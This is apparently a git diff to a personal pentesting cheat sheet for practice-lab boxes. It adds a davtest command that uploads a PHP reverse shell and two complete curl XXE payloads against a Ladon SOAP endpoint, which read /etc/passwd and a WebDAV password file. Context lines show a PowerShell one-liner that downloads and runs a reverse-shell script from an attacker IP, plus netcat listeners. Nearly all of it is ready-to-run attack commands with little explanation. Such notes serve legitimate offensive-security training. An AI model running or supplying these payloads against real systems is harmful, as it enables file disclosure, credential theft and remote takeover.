@@ -13,6 +13,7 @@
 - [MSSQL HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
 - [Evil WinRM Guide](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)
 ### <ins>80/443 - HTTP</ins>
+[Webdav](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav)
 
 #### First Thing
 
@@ -30,6 +31,8 @@
 
 6. WordPress Scan: wpscan --url http://<IP>/
 
+7. Had at least one PG Box that had a Webdav folder. Used "davtest" to figure out I could upload a reverse shell.
+	1. davtest -auth administrant:sleepless -url http://muddy.ugc/webdav/ -uploadloc / -uploadfile php_reverse_shell.php
 ```
 
 #### While Scans run:
@@ -807,4 +810,57 @@ nc -nlvp 443
 5. python3 -m http.server 80
 6. rlwrap -cAr nc -lvnp 4444
 7. python3 47799.py $ip "powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.45.164/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.164 -Port 4444"
+```
+
+### <ins>Port 8888 Ladon</ins>
+[Ladon Exploit](https://www.exploit-db.com/exploits/43113)
+[WebDav](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav)
+
+```
+Had this on a PG Box, had to do the following to get a password to a WebDav folder:
+
+┌──(kali㉿kali)-[~]
+└─$ curl -s -X $'POST' \
+-H $'Content-Type: text/xml;charset=UTF-8' \
+-H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
+--data-binary $'<?xml version="1.0"?>
+<!DOCTYPE uid
+[<!ENTITY passwd SYSTEM "file:///etc/passwd">
+]>
+<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
+xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
+<soapenv:Body>
+<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
+<uid xsi:type=\"xsd:string\">&passwd;</uid>
+</urn:checkout>
+</soapenv:Body>
+</soapenv:Envelope>' \
+'http://muddy.ugc:8888/muddy/soap11/checkout' | xmllint --format -
+...
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -s -X $'POST' \
+-H $'Content-Type: text/xml;charset=UTF-8' \
+-H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
+--data-binary $'<?xml version="1.0"?>
+<!DOCTYPE uid
+[<!ENTITY passwd SYSTEM "file:///var/www/html/webdav/passwd.dav">
+]>
+<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
+xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
+<soapenv:Body>
+<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
+<uid xsi:type=\"xsd:string\">&passwd;</uid>
+</urn:checkout>
+</soapenv:Body>
+</soapenv:Envelope>' \
+'http://muddy.ugc:8888/muddy/soap11/checkout' | xmllint --format -
+...
+
+
 ```
